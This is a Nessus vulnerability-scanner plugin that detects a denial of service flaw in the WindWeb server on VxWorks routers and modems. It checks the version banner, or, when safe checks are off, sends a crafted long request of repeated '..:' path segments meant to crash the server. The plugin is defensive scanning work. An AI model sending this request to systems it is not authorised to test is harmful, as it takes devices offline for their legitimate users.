#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server is prone to denial of service attacks. 

Description :

The remote host appears to be running the WindWeb web server, which is
found on embedded devices running Wind River Systems' VxWorks such as
certain ADSL modems and routers. 

The version of WindWeb installed on the remote host is affected by a
remote denial of service vulnerability when it receives
maliciously-crafted requests.  An attacker may be able to leverage
this issue to deny access to the web server to legitimate users. 

See also : 

http://downloads.securityfocus.com/vulnerabilities/exploits/Hasbani_dos.c

Solution : 

Limit access to the web server.

Risk factor : 

Low / CVSS Base Score : 3 
(AV:R/AC:L/Au:NR/C:N/A:C/I:N/B:N)";


if (description) {
  script_id(20097);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3475");
  script_bugtraq_id(15225);
  script_xref(name:"OSVDB", value:"20447");

  script_name(english:"WindWeb <= 2.0 Denial of Service Vulnerability");
  script_summary(english:"Checks for denial of service vulnerability in WindWeb <= 2.0");
 
  script_description(english:desc);

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Make sure it's WindWeb.
banner = get_http_banner(port:port);
if (banner && " WindWeb/" >< banner) {
  # If safe checks are enabled...
  if (safe_checks()) {
    # If we're being paranoid...
    if (report_paranoia > 1) {
      if (egrep(pattern:"^Server: +WindWeb/([01]\.|2\.0$)", string:banner)) {
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Nessus has determined the vulnerability exists on the remote\n",
          "host simply by looking at the version number of WindWeb\n",
          "installed there.\n"
        );
        security_note(port:port, data:report);
      }
    }
  }
  # Otherwise, try to crash it.
  else if (!http_is_dead(port:port)) {
    soc = http_open_socket(port);
    if (!soc) exit(0);

    req = "";
    while (strlen(req) < 759) req += "..:";
    req = string("GET /", req, " HTTP/1.0\n\n\n");
    send(socket:soc, data:req);
    http_close_socket(soc);

    sleep(1);
    if (http_is_dead(port:port)) {
      security_note(port);
      exit(0);
    }
  }
}
